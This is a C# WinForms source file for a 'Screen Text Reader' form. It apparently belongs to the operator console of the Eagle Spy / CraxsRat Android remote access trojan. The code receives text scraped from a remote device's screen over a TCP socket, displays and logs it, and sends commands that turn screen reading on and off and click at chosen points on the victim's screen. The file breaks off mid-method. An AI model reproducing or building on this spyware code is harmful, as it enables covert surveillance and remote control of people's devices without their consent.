using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Diagnostics.Eventing.Reader;
using System.Drawing;
using System.IO;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Text;
using System.Windows.Forms;
using Eagle_Spy.sockets;
using DrakeUI.Framework;
using Microsoft.VisualBasic.CompilerServices;

namespace Eagle_Spy;

[DesignerGenerated]
public class ScreenReader : Form
{
	public delegate void addLogback(object[] objs);

	[CompilerGenerated]
	internal sealed class _Closure_0024__52_002D0
	{
		public TextBox _0024VB_0024Local_Type;

		public string[] _0024VB_0024Local_sizearry;

		public ScreenReader _0024VB_0024Me;

		public _Closure_0024__52_002D0(_Closure_0024__52_002D0 arg0)
		{
			if (arg0 != null)
			{
				_0024VB_0024Local_Type = arg0._0024VB_0024Local_Type;
				_0024VB_0024Local_sizearry = arg0._0024VB_0024Local_sizearry;
			}
		}

		[SpecialName]
		internal void _Lambda_0024__0(object sender2, EventArgs eventargs2)
		{
			try
			{
				Clipboard.SetText(_0024VB_0024Local_Type.Text);
				CraxsAlert.ShowSucess("Text Copied.");
				_0024VB_0024Local_Type.Tag = "E";
			}
			catch (Exception)
			{
				//ProjectData.SetProjectError(projectError);
				//////CraxsAlert.Showinformation("Sorry");
			}
		}

		[SpecialName]
		internal void _Lambda_0024__1(object sender2, MouseEventArgs eventargs2)
		{
			try
			{
				string text = "clk:";
				_0024VB_0024Me.tiks = 0;
				_0024VB_0024Me.viewpanel.PointToClient(Control.MousePosition);
				text = text + Convert.ToInt32(Conversions.ToDouble(_0024VB_0024Local_sizearry[0])) + ":" + Convert.ToInt32(Conversions.ToDouble(_0024VB_0024Local_sizearry[1]));
				string[] array = _0024VB_0024Me.Classclient.Keys.Split(':');
				object[] parametersObjects = new object[4]
				{
					_0024VB_0024Me.Classclient.myClient,
					SecurityKey.KeysClient2 + Data.SPL_SOCKET + "sp<*>" + text + Data.SPL_SOCKET + array[0] + Data.SPL_SOCKET + array[1] + Data.SPL_SOCKET + SecurityKey.Lockscreen + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Data.SPL_ARRAY + Data.SPL_SOCKET + _0024VB_0024Me.Classclient.ClientRemoteAddress,
					Codes.Encoding().GetBytes("null"),
					_0024VB_0024Me.Classclient
				};
				_0024VB_0024Me.Classclient.SendMessage(parametersObjects);
			}
			catch (Exception)
			{
				//ProjectData.SetProjectError(projectError);
				//////CraxsAlert.Showinformation("Sorry");
			}
		}
	}

	private IContainer components;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("viewpanel")]
	private Panel _viewpanel;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("disablebtn")]
	private DrakeUIButtonIcon _disablebtn;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("enablebtn")]
	private DrakeUIButtonIcon _enablebtn;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("DrakeUIButtonIcon2")]
	private DrakeUIButtonIcon _DrakeUIButtonIcon2;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("Timer1")]
	private Timer _Timer1;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("DrakeUIButtonIcon1")]
	private DrakeUIButtonIcon _DrakeUIButtonIcon1;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("DrakeUIButtonIcon3")]
	private DrakeUIButtonIcon _DrakeUIButtonIcon3;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("DrakeUIButtonIcon4")]
	private DrakeUIButtonIcon _DrakeUIButtonIcon4;

	public Client Classclient;

	public string Title;

	public object firstclick;

	public ScreenLoger LogScreen;

	private int tiks;

	private bool Swaping;

	private bool isdown;

	private bool isclick;

	public Size ScreenSize;

	private List<Point> Trakpoint;

	[field: AccessedThroughProperty("Panel2")]
	internal Panel Panel2
	;

	internal DrakeUIButtonIcon disablebtn
	;

	internal DrakeUIButtonIcon enablebtn
	;

	internal DrakeUIButtonIcon DrakeUIButtonIcon2
;

	internal Timer Timer1
;
	private Panel panel3;
	private Label label1;
	private DrakeUIButtonIcon drakeUIButtonIcon5;
	private SaveFileDialog saveFileDialog1;
    private Sipaa.Framework.SButton sButton1;
    private Sipaa.Framework.SButton sButton3;
    private Sipaa.Framework.SButton sButton2;
    private Sipaa.Framework.SPanel viewpanel;
    private Guna.UI2.WinForms.Guna2TextBox textBox1;
    private DrakeUIGradientPanel drakeUIGradientPanel1;
	public ScreenReader()
	{
		base.Load += CraxsRatkfvuiorkenfudpajrsnCraxsRatsijygesq;
		base.FormClosing += ScreenReader_FormClosing;
		Title = "null";
		firstclick = true;
		tiks = 0;
		Swaping = false;
		isdown = false;
		isclick = false;
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && components != null)
				components.Dispose();
		}
		finally
		{
			base.Dispose(disposing);
		}
	}

	[System.Diagnostics.DebuggerStepThrough]
	private void InitializeComponent()
	{
            this.components = new System.ComponentModel.Container();
            this.drakeUIGradientPanel1 = new DrakeUI.Framework.DrakeUIGradientPanel();
            this.sButton3 = new Sipaa.Framework.SButton();
            this.sButton2 = new Sipaa.Framework.SButton();
            this.sButton1 = new Sipaa.Framework.SButton();
            this.Panel2 = new System.Windows.Forms.Panel();
            this.panel3 = new System.Windows.Forms.Panel();
            this.drakeUIButtonIcon5 = new DrakeUI.Framework.DrakeUIButtonIcon();
            this.label1 = new System.Windows.Forms.Label();
            this.DrakeUIButtonIcon2 = new DrakeUI.Framework.DrakeUIButtonIcon();
            this.disablebtn = new DrakeUI.Framework.DrakeUIButtonIcon();
            this.enablebtn = new DrakeUI.Framework.DrakeUIButtonIcon();
            this.Timer1 = new System.Windows.Forms.Timer(this.components);
            this.saveFileDialog1 = new System.Windows.Forms.SaveFileDialog();
            this.viewpanel = new Sipaa.Framework.SPanel();
            this.textBox1 = new Guna.UI2.WinForms.Guna2TextBox();
            this.drakeUIGradientPanel1.SuspendLayout();
            this.Panel2.SuspendLayout();
            this.panel3.SuspendLayout();
            this.SuspendLayout();
            // 
            // drakeUIGradientPanel1
            // 
            this.drakeUIGradientPanel1.Controls.Add(this.sButton3);
            this.drakeUIGradientPanel1.Controls.Add(this.sButton2);
            this.drakeUIGradientPanel1.Controls.Add(this.sButton1);
            this.drakeUIGradientPanel1.Dock = System.Windows.Forms.DockStyle.Bottom;
            this.drakeUIGradientPanel1.FillColor = System.Drawing.Color.Black;
            this.drakeUIGradientPanel1.Font = new System.Drawing.Font("Microsoft Sans Serif", 12F);
            this.drakeUIGradientPanel1.ForeColor = System.Drawing.Color.Red;
            this.drakeUIGradientPanel1.ForeDisableColor = System.Drawing.Color.Red;
            this.drakeUIGradientPanel1.Location = new System.Drawing.Point(0, 717);
            this.drakeUIGradientPanel1.Margin = new System.Windows.Forms.Padding(4, 5, 4, 5);
            this.drakeUIGradientPanel1.Name = "drakeUIGradientPanel1";
            this.drakeUIGradientPanel1.RectColor = System.Drawing.Color.Red;
            this.drakeUIGradientPanel1.RectDisableColor = System.Drawing.Color.Red;
            this.drakeUIGradientPanel1.Size = new System.Drawing.Size(624, 38);
            this.drakeUIGradientPanel1.Style = DrakeUI.Framework.UIStyle.Custom;
            this.drakeUIGradientPanel1.TabIndex = 25;
            this.drakeUIGradientPanel1.Text = null;
            // 
            // sButton3
            // 
            this.sButton3.BackColor = System.Drawing.Color.Black;
            this.sButton3.BorderColor = System.Drawing.Color.Red;
            this.sButton3.BorderRadius = 6;
            this.sButton3.BorderSize = 2;
            this.sButton3.FlatAppearance.BorderSize = 0;
            this.sButton3.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.sButton3.Font = new System.Drawing.Font("Bahnschrift", 12F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.sButton3.ForeColor = System.Drawing.Color.White;
            this.sButton3.Location = new System.Drawing.Point(428, 7);
            this.sButton3.Name = "sButton3";
            this.sButton3.Size = new System.Drawing.Size(84, 28);
            this.sButton3.TabIndex = 5;
            this.sButton3.Text = "Save";
            this.sButton3.UseVisualStyleBackColor = false;
            this.sButton3.Click += new System.EventHandler(this.sButton3_Click);
            // 
            // sButton2
            // 
            this.sButton2.BackColor = System.Drawing.Color.Black;
            this.sButton2.BorderColor = System.Drawing.Color.Red;
            this.sButton2.BorderRadius = 6;
            this.sButton2.BorderSize = 2;
            this.sButton2.FlatAppearance.BorderSize = 0;
            this.sButton2.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.sButton2.Font = new System.Drawing.Font("Bahnschrift", 12F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.sButton2.ForeColor = System.Drawing.Color.White;
            this.sButton2.Location = new System.Drawing.Point(192, 4);
            this.sButton2.Name = "sButton2";
            this.sButton2.Size = new System.Drawing.Size(84, 28);
            this.sButton2.TabIndex = 4;
            this.sButton2.Text = "Stop";
            this.sButton2.UseVisualStyleBackColor = false;
            this.sButton2.Click += new System.EventHandler(this.sButton2_Click);
            // 
            // sButton1
            // 
            this.sButton1.BackColor = System.Drawing.Color.Black;
            this.sButton1.BorderColor = System.Drawing.Color.Red;
            this.sButton1.BorderRadius = 6;
            this.sButton1.BorderSize = 2;
            this.sButton1.FlatAppearance.BorderSize = 0;
            this.sButton1.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.sButton1.Font = new System.Drawing.Font("Bahnschrift", 12F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.sButton1.ForeColor = System.Drawing.Color.White;
            this.sButton1.Location = new System.Drawing.Point(12, 4);
            this.sButton1.Name = "sButton1";
            this.sButton1.Size = new System.Drawing.Size(84, 28);
            this.sButton1.TabIndex = 3;
            this.sButton1.Text = "Start";
            this.sButton1.UseVisualStyleBackColor = false;
            this.sButton1.Click += new System.EventHandler(this.sButton1_Click);
            // 
            // Panel2
            // 
            this.Panel2.BackColor = System.Drawing.Color.Black;
            this.Panel2.Controls.Add(this.panel3);
            this.Panel2.Controls.Add(this.DrakeUIButtonIcon2);
            this.Panel2.Controls.Add(this.disablebtn);
            this.Panel2.Controls.Add(this.enablebtn);
            this.Panel2.Dock = System.Windows.Forms.DockStyle.Top;
            this.Panel2.Location = new System.Drawing.Point(0, 0);
            this.Panel2.Name = "Panel2";
            this.Panel2.Size = new System.Drawing.Size(624, 38);
            this.Panel2.TabIndex = 0;
            // 
            // panel3
            // 
            this.panel3.Controls.Add(this.drakeUIButtonIcon5);
            this.panel3.Controls.Add(this.label1);
            this.panel3.Dock = System.Windows.Forms.DockStyle.Fill;
            this.panel3.Location = new System.Drawing.Point(0, 0);
            this.panel3.Name = "panel3";
            this.panel3.Size = new System.Drawing.Size(624, 38);
            this.panel3.TabIndex = 23;
            // 
            // drakeUIButtonIcon5
            // 
            this.drakeUIButtonIcon5.BackColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon5.Cursor = System.Windows.Forms.Cursors.Hand;
            this.drakeUIButtonIcon5.Dock = System.Windows.Forms.DockStyle.Top;
            this.drakeUIButtonIcon5.FillColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon5.FillDisableColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon5.FillHoverColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon5.FillPressColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon5.FillSelectedColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon5.Font = new System.Drawing.Font("Microsoft Sans Serif", 12F);
            this.drakeUIButtonIcon5.ForeColor = System.Drawing.Color.Red;
            this.drakeUIButtonIcon5.ForeDisableColor = System.Drawing.Color.Red;
            this.drakeUIButtonIcon5.ForeHoverColor = System.Drawing.Color.Red;
            this.drakeUIButtonIcon5.ForePressColor = System.Drawing.Color.Red;
            this.drakeUIButtonIcon5.ForeSelectedColor = System.Drawing.Color.Red;
            this.drakeUIButtonIcon5.Location = new System.Drawing.Point(0, 0);
            this.drakeUIButtonIcon5.Name = "drakeUIButtonIcon5";
            this.drakeUIButtonIcon5.Radius = 10;
            this.drakeUIButtonIcon5.RectColor = System.Drawing.Color.Red;
            this.drakeUIButtonIcon5.RectDisableColor = System.Drawing.Color.Red;
            this.drakeUIButtonIcon5.RectHoverColor = System.Drawing.Color.Red;
            this.drakeUIButtonIcon5.RectPressColor = System.Drawing.Color.Red;
            this.drakeUIButtonIcon5.RectSelectedColor = System.Drawing.Color.Red;
            this.drakeUIButtonIcon5.Size = new System.Drawing.Size(624, 30);
            this.drakeUIButtonIcon5.Style = DrakeUI.Framework.UIStyle.Custom;
            this.drakeUIButtonIcon5.Symbol = 61965;
            this.drakeUIButtonIcon5.TabIndex = 1;
            this.drakeUIButtonIcon5.Text = "Screen Texts Reader";
            // 
            // label1
            // 
            this.label1.AutoSize = true;
            this.label1.Font = new System.Drawing.Font("Bahnschrift", 15.75F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.label1.ForeColor = System.Drawing.Color.Red;
            this.label1.Location = new System.Drawing.Point(76, 5);
            this.label1.Name = "label1";
            this.label1.Size = new System.Drawing.Size(195, 25);
            this.label1.TabIndex = 0;
            this.label1.Text = "Screen Text Reader";
            // 
            // DrakeUIButtonIcon2
            // 
            this.DrakeUIButtonIcon2.Cursor = System.Windows.Forms.Cursors.Hand;
            this.DrakeUIButtonIcon2.FillColor = System.Drawing.Color.Black;
            this.DrakeUIButtonIcon2.FillHoverColor = System.Drawing.Color.FromArgb(((int)(((byte)(20)))), ((int)(((byte)(20)))), ((int)(((byte)(20)))));
            this.DrakeUIButtonIcon2.FillPressColor = System.Drawing.Color.Black;
            this.DrakeUIButtonIcon2.FillSelectedColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.DrakeUIButtonIcon2.Font = new System.Drawing.Font("Calibri", 12F);
            this.DrakeUIButtonIcon2.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.DrakeUIButtonIcon2.ForePressColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.DrakeUIButtonIcon2.Location = new System.Drawing.Point(147, 12);
            this.DrakeUIButtonIcon2.Name = "DrakeUIButtonIcon2";
            this.DrakeUIButtonIcon2.Radius = 25;
            this.DrakeUIButtonIcon2.RectColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.DrakeUIButtonIcon2.RectDisableColor = System.Drawing.Color.FromArgb(((int)(((byte)(227)))), ((int)(((byte)(242)))), ((int)(((byte)(253)))));
            this.DrakeUIButtonIcon2.RectHoverColor = System.Drawing.Color.White;
            this.DrakeUIButtonIcon2.RectPressColor = System.Drawing.Color.White;
            this.DrakeUIButtonIcon2.RectSelectedColor = System.Drawing.Color.White;
            this.DrakeUIButtonIcon2.Size = new System.Drawing.Size(129, 26);
            this.DrakeUIButtonIcon2.Style = DrakeUI.Framework.UIStyle.Custom;
            this.DrakeUIButtonIcon2.Symbol = 57469;
            this.DrakeUIButtonIcon2.TabIndex = 22;
            this.DrakeUIButtonIcon2.Text = "Clear";
            this.DrakeUIButtonIcon2.Click += new System.EventHandler(this.DrakeUIButtonIcon2_Click);
            // 
            // disablebtn
            // 
            this.disablebtn.Cursor = System.Windows.Forms.Cursors.Hand;
            this.disablebtn.FillColor = System.Drawing.Color.Black;
            this.disablebtn.FillHoverColor = System.Drawing.Color.FromArgb(((int)(((byte)(20)))), ((int)(((byte)(20)))), ((int)(((byte)(20)))));
            this.disablebtn.FillPressColor = System.Drawing.Color.Black;
            this.disablebtn.FillSelectedColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.disablebtn.Font = new System.Drawing.Font("Calibri", 12F);
            this.disablebtn.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.disablebtn.ForePressColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.disablebtn.Location = new System.Drawing.Point(282, 12);
            this.disablebtn.Name = "disablebtn";
            this.disablebtn.Radius = 25;
            this.disablebtn.RectColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.disablebtn.RectDisableColor = System.Drawing.Color.FromArgb(((int)(((byte)(227)))), ((int)(((byte)(242)))), ((int)(((byte)(253)))));
            this.disablebtn.RectHoverColor = System.Drawing.Color.White;
            this.disablebtn.RectPressColor = System.Drawing.Color.White;
            this.disablebtn.RectSelectedColor = System.Drawing.Color.White;
            this.disablebtn.Size = new System.Drawing.Size(129, 26);
            this.disablebtn.Style = DrakeUI.Framework.UIStyle.Custom;
            this.disablebtn.Symbol = 61534;
            this.disablebtn.TabIndex = 21;
            this.disablebtn.Text = "Disable";
            this.disablebtn.Click += new System.EventHandler(this.DrakeUIButtonIcon1_Click);
            // 
            // enablebtn
            // 
            this.enablebtn.Cursor = System.Windows.Forms.Cursors.Hand;
            this.enablebtn.FillColor = System.Drawing.Color.Black;
            this.enablebtn.FillHoverColor = System.Drawing.Color.FromArgb(((int)(((byte)(20)))), ((int)(((byte)(20)))), ((int)(((byte)(20)))));
            this.enablebtn.FillPressColor = System.Drawing.Color.Black;
            this.enablebtn.FillSelectedColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.enablebtn.Font = new System.Drawing.Font("Calibri", 12F);
            this.enablebtn.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.enablebtn.ForePressColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.enablebtn.Location = new System.Drawing.Point(12, 12);
            this.enablebtn.Name = "enablebtn";
            this.enablebtn.Radius = 25;
            this.enablebtn.RectColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.enablebtn.RectDisableColor = System.Drawing.Color.FromArgb(((int)(((byte)(227)))), ((int)(((byte)(242)))), ((int)(((byte)(253)))));
            this.enablebtn.RectHoverColor = System.Drawing.Color.White;
            this.enablebtn.RectPressColor = System.Drawing.Color.White;
            this.enablebtn.RectSelectedColor = System.Drawing.Color.White;
            this.enablebtn.Size = new System.Drawing.Size(129, 26);
            this.enablebtn.Style = DrakeUI.Framework.UIStyle.Custom;
            this.enablebtn.Symbol = 61671;
            this.enablebtn.TabIndex = 20;
            this.enablebtn.Text = "Enable";
            // 
            // Timer1
            // 
            this.Timer1.Interval = 1000;
            this.Timer1.Tick += new System.EventHandler(this.Timer1_Tick);
            // 
            // viewpanel
            // 
            this.viewpanel.BackColor = System.Drawing.Color.Black;
            this.viewpanel.BorderColor = System.Drawing.Color.Red;
            this.viewpanel.BorderRadius = 6;
            this.viewpanel.BorderSize = 1;
            this.viewpanel.ForeColor = System.Drawing.Color.White;
            this.viewpanel.Location = new System.Drawing.Point(3, 33);
            this.viewpanel.Name = "viewpanel";
            this.viewpanel.Size = new System.Drawing.Size(346, 682);
            this.viewpanel.TabIndex = 26;
            this.viewpanel.MouseDown += new System.Windows.Forms.MouseEventHandler(this.Viewpanel_MouseDown);
            this.viewpanel.MouseMove += new System.Windows.Forms.MouseEventHandler(this.Viewpanel_MouseMove);
            this.viewpanel.MouseUp += new System.Windows.Forms.MouseEventHandler(this.Viewpanel_MouseUp);
            // 
            // textBox1
            // 
            this.textBox1.BorderColor = System.Drawing.Color.Red;
            this.textBox1.Cursor = System.Windows.Forms.Cursors.IBeam;
            this.textBox1.DefaultText = "";
            this.textBox1.DisabledState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(208)))), ((int)(((byte)(208)))), ((int)(((byte)(208)))));
            this.textBox1.DisabledState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(226)))), ((int)(((byte)(226)))), ((int)(((byte)(226)))));
            this.textBox1.DisabledState.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(138)))), ((int)(((byte)(138)))), ((int)(((byte)(138)))));
            this.textBox1.DisabledState.PlaceholderForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(138)))), ((int)(((byte)(138)))), ((int)(((byte)(138)))));
            this.textBox1.FillColor = System.Drawing.Color.Black;
            this.textBox1.FocusedState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(94)))), ((int)(((byte)(148)))), ((int)(((byte)(255)))));
            this.textBox1.Font = new System.Drawing.Font("Segoe UI", 9.75F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.textBox1.ForeColor = System.Drawing.Color.White;
            this.textBox1.HoverState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(94)))), ((int)(((byte)(148)))), ((int)(((byte)(255)))));
            this.textBox1.Location = new System.Drawing.Point(355, 33);
            this.textBox1.Multiline = true;
            this.textBox1.Name = "textBox1";
            this.textBox1.PasswordChar = '\0';
            this.textBox1.PlaceholderText = "";
            this.textBox1.ScrollBars = System.Windows.Forms.ScrollBars.Vertical;
            this.textBox1.SelectedText = "";
            this.textBox1.Size = new System.Drawing.Size(266, 682);
            this.textBox1.TabIndex = 27;
            // 
            // ScreenReader
            // 
            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
            this.BackColor = System.Drawing.Color.Black;
            this.ClientSize = new System.Drawing.Size(624, 755);
            this.Controls.Add(this.textBox1);
            this.Controls.Add(this.viewpanel);
            this.Controls.Add(this.drakeUIGradientPanel1);
            this.Controls.Add(this.Panel2);
            this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.FixedToolWindow;
            this.MaximumSize = new System.Drawing.Size(640, 794);
            this.MinimumSize = new System.Drawing.Size(640, 794);
            this.Name = "ScreenReader";
            this.ShowIcon = false;
            this.Text = "Text Reader";
            this.drakeUIGradientPanel1.ResumeLayout(false);
            this.Panel2.ResumeLayout(false);
            this.panel3.ResumeLayout(false);
            this.panel3.PerformLayout();
            this.ResumeLayout(false);

	}

	private void CraxsRatkfvuiorkenfudpajrsnCraxsRatsaxrftyu(object sender, EventArgs e)
	{
		
	}

	private void DrakeUIButtonIcon1_Click(object sender, EventArgs e)
	{
		if (Classclient != null)
		{
			TcpClient myClient = Classclient.myClient;
			string[] array = Classclient.Keys.Split(':');
			object[] parametersObjects = new object[4]
			{
				myClient,
				SecurityKey.KeysClient2 + Data.SPL_SOCKET + "SCRD<*>f" + Data.SPL_SOCKET + array[0] + Data.SPL_SOCKET + array[1] + Data.SPL_SOCKET + SecurityKey.Lockscreen + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Data.SPL_ARRAY + Data.SPL_SOCKET + Classclient.ClientRemoteAddress,
				Codes.Encoding().GetBytes("null"),
				Classclient
			};
			Classclient.SendMessage(parametersObjects);
			enablebtn.Enabled = true;
			disablebtn.Enabled = false;
		}
	}

	public void CraxsRatkfvuiorkenfudpajrsnCraxsRatsxczxsdkh(object[] objs)
	{
		checked
		{
			try
			{
				if (viewpanel.InvokeRequired)
				{
					addLogback method = CraxsRatkfvuiorkenfudpajrsnCraxsRatsxczxsdkh;
					viewpanel.Invoke(method, new object[1] { objs });
					return;
				}
				string text = Conversions.ToString(objs[0]);
				if (Operators.CompareString(text, "CLR", TextCompare: false) == 0)
				{
					viewpanel.Controls.Clear();
					return;
				}
				string[] array = text.Split('^');
				int num = array.Length - 1;
				_Closure_0024__52_002D0 closure_0024__52_002D = default(_Closure_0024__52_002D0);
				for (int i = 0; i <= num; i++)
				{
					closure_0024__52_002D = new _Closure_0024__52_002D0(closure_0024__52_002D);
					closure_0024__52_002D._0024VB_0024Me = this;
					string[] array2 = array[i].Split(':');
					closure_0024__52_002D._0024VB_0024Local_Type = new TextBox();
                    string text2 = array2[0];
                    if (!string.IsNullOrWhiteSpace(text2) && !text2.Contains("null"))
                    {
                        textBox1.AppendText("> " + text2 + "\r\n");
                    }
                    closure_0024__52_002D._0024VB_0024Local_sizearry = array2[1].Split('~');
					string[] array3 = array2[2].Split('~');
					string[] array4 = null;
					try
					{
						array4 = array2[3].Split('~');
					}
					catch (Exception)
					{
						//ProjectData.SetProjectError(projectError);
						array4 = null;
						//////CraxsAlert.Showinformation("Sorry");
					}
					int num2 = Conversions.ToInteger(array3[0]);
					int num3 = Conversions.ToInteger(array3[1]);
					if (ScreenSize == default(Size))
						ScreenSize = new Size(Conversions.ToInteger(array3[0]), Conversions.ToInteger(array3[1]));
					closure_0024__52_002D._0024VB_0024Local_Type.Location = new Point((int)Math.Round(Conversions.ToDouble(closure_0024__52_002D._0024VB_0024Local_sizearry[0]) * ((double)viewpanel.Width / (double)num2)), (int)Math.Round(Conversions.ToDouble(closure_0024__52_002D._0024VB_0024Local_sizearry[1]) * ((double)viewpanel.Height / (double)num3)));
					foreach (Control control in viewpanel.Controls)
					{
						try
						{
							if (closure_0024__52_002D._0024VB_0024Local_Type.Bounds.IntersectsWith(control.Bounds) && closure_0024__52_002D._0024VB_0024Local_Type.Text.Equals(control.Text, StringComparison.CurrentCultureIgnoreCase))
								viewpanel.Controls.Remove(control);
						}
						catch (Exception)
						{
							//ProjectData.SetProjectError(projectError2);
							//////CraxsAlert.Showinformation("Sorry");
						}
					}
					closure_0024__52_002D._0024VB_0024Local_Type.Text = text2;
					if (array4 == null)
					{
						Size size = TextRenderer.MeasureText(closure_0024__52_002D._0024VB_0024Local_Type.Text, closure_0024__52_002D._0024VB_0024Local_Type.Font);
						closure_0024__52_002D._0024VB_0024Local_Type.Size = new Size(size.Width, 20);
					}
					else
					{
						Size size2 = TextRenderer.MeasureText(closure_0024__52_002D._0024VB_0024Local_Type.Text, closure_0024__52_002D._0024VB_0024Local_Type.Font);
						closure_0024__52_002D._0024VB_0024Local_Type.Size = new Size(size2.Width, Conversions.ToInteger(array4[1]));
					}
					closure_0024__52_002D._0024VB_0024Local_Type.BorderStyle = BorderStyle.None;
					closure_0024__52_002D._0024VB_0024Local_Type.BackColor = Color.Black;
					closure_0024__52_002D._0024VB_0024Local_Type.ForeColor = Color.Red;
					closure_0024__52_002D._0024VB_0024Local_Type.ReadOnly = true;
					closure_0024__52_002D._0024VB_0024Local_Type.BorderStyle = BorderStyle.FixedSingle;
					closure_0024__52_002D._0024VB_0024Local_Type.DoubleClick += closure_0024__52_002D._Lambda_0024__0;
					closure_0024__52_002D._0024VB_0024Local_Type.MouseClick += closure_0024__52_002D._Lambda_0024__1;
					viewpanel.Controls.Add(closure_0024__52_002D._0024VB_0024Local_Type);
				}
			}
			catch (Exception)
			{
				//ProjectData.SetProjectError(projectError3);
				//////CraxsAlert.Showinformation("Sorry");
			}
		}
	}

	private void CraxsRatkfvuiorkenfudpajrsnCraxsRatsijygesq(object sender, EventArgs e)
	{
	Timer1.Enabled = true;
		Timer1.Start();
	}

	private void DrakeUIButtonIcon2_Click(object sender, EventArgs e)
	{
		try
		{
			viewpanel.Controls.Clear();
		}
		catch (Exception)
		{
			//ProjectData.SetProjectError(projectError);
			//////CraxsAlert.Showinformation("Sorry");
		}
	}

	private void Timer1_Tick(object sender, EventArgs e)
	{
		if (viewpanel.Controls.Count <= 0)
			return;
		checked
		{
			int num = viewpanel.Controls.Count - 1;
			for (int i = 0; i <= num; i++)
			{
				try
				{
					if (viewpanel.Controls[i].Tag != null && Operators.ConditionalCompareObjectEqual(viewpanel.Controls[i].Tag, "E", TextCompare: false))
						viewpanel.Controls.Remove(viewpanel.Controls[i]);
				}
				catch (Exception)
				{
					//ProjectData.SetProjectError(projectError);
					//////CraxsAlert.Showinformation("Sorry");
				}
			}
		}
	}

	private void ScreenReader_FormClosing(object sender, FormClosingEventArgs e)
	{
		if (Classclient != null)
		{
			TcpClient myClient = Classclient.myClient;
			string[] array = Classclient.Keys.Split(':');
			object[] parametersObjects = new object[4]
			{
				myClient,
				SecurityKey.KeysClient2 + Data.SPL_SOCKET + "SCRD<*>f" + Data.SPL_SOCKET + array[0] + Data.SPL_SOCKET + array[1] + Data.SPL_SOCKET + SecurityKey.Lockscreen + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Data.SPL_ARRAY + Data.SPL_SOCKET + Classclient.ClientRemoteAddress,
				Codes.Encoding().GetBytes("null"),
				Classclient
			};
			Classclient.SendMessage(parametersObjects);
		}
		Timer1.Stop();
		Timer1.Enabled = false;
	}

	private void DrakeUIButtonIcon4_Click(object sender, EventArgs e)
	{
		if (Classclient != null)
			try
			{
				string[] array = Classclient.Keys.Split(':');
				object[] parametersObjects = new object[4]
				{
					Classclient.myClient,
